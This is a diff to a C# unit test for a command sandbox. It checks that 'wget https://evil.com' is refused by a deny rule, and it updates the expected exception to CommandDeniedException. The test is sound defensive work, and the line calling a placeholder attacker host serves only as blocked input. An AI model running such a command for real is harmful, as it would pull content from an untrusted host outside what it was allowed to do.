@@ -80,10 +80,11 @@ public sealed class AddSandboxServicesTests
         var cwd = Path.Combine(Path.GetTempPath(), "add-sandbox-tests", "repo");
 
         // wget is denied by the registered rule — the public-path sandbox must reject it
-        // before spawning any process, proving the deny policy is wired through DI.
+        // before spawning any process, proving the deny policy is wired through DI. A deny hit is
+        // recoverable (never executed), so it surfaces as CommandDeniedException.
         var act = async () => await sandbox.RunAsync(
             "wget https://evil.com", cwd, TimeSpan.FromSeconds(5), CancellationToken.None);
 
-        await act.Should().ThrowAsync<SandboxViolationException>();
+        await act.Should().ThrowAsync<CommandDeniedException>();
     }
 }
